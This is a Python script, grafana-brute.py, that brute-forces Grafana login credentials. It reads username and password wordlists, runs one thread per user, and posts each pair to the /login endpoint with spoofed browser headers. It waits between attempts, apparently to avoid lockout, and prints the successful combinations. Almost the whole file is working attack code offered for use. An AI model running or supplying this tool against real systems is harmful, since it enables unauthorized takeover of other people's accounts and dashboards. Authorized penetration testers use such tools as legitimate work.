#!/usr/bin/env python
#
# grafana-brute.py
# Read from a list of combinations for logins for grafana
#
# ref: https://raw.githubusercontent.com/RandomRobbieBF/grafana-bruteforce/master/grafana-brute.py
#

from colorama import Fore, Style
import argparse
import requests
import sys
import threading
import time

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

# Proxy to be left blank if not required.
http_proxy = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
              "https" : http_proxy,
              "ftp"   : http_proxy
            }

SLEEP_TIME= 1 * 60 + 20

def login_thread(url: str, user: str , pass_list: list[str]) -> None:
    try:
        for password in pass_list:
            headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
            response = session.get(""+url+"/login",headers=headers, verify=False,timeout=10,proxies=proxyDict)

            if response.status_code != 200:
                print ("http response was not 200 ok please check url")
                sys.exit(1)

            rawBody = "{\"user\":\""+user+"\",\"email\":\"\",\"password\":\""+password+"\"}"
            headers2 = {"Origin":""+url+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Referer":""+url+"/login","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
            response2 = session.post(""+url+"/login", data=rawBody, headers=headers2, verify=False,timeout=10,proxies=proxyDict)
            if response2.status_code != 200:
                if response2.status_code == 401:
                    print(f"Username: {user} Password: {password} Failed")
            if response2.status_code == 200:
                if "Logged in" in response2.text:
                    print(f"{Fore.GREEN}Username: {user}, Password: {password} Sucessful{Style.RESET_ALL}")
                else:
                    print(f"Username: {user} Password: {password} Failed - Check Proxy for response to see why.")
            time.sleep(SLEEP_TIME)

    except Exception as why:
        print('Error: %s' % why)
        sys.exit(1)


def main(args):
    try:
        url = args.url

        userlist = []
        with open(args.userfile) as uf:
            userlist = [u.strip() for u in uf.readlines()]

        passlist = []
        with open(args.passfile) as pf:
            passlist = [p.strip() for p in pf.readlines()]

        print(f"userlist_num:{len(userlist)}, passlist_num:{len(passlist)}")
        if len(userlist) < 1 or len(passlist) < 1 :
            print("user/pass list File have no content")
            sys.exit(1)

        for user in userlist:
            t = threading.Thread(target=login_thread, args=(url, user, passlist), name=f"{user}-login")
            t.start()

    except IOError:
        print("File not accessible")
        sys.exit(1)

    except KeyboardInterrupt:
        print ("Ctrl-c pressed ...")
        sys.exit(1)

    except Exception as e:
        print('Error: %s' % e)
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Grafana Url")
    parser.add_argument("-U", "--userfile", required=True, help="username list file")
    parser.add_argument("-P", "--passfile", required=True, help="password list file")
    args = parser.parse_args()
    main(args)
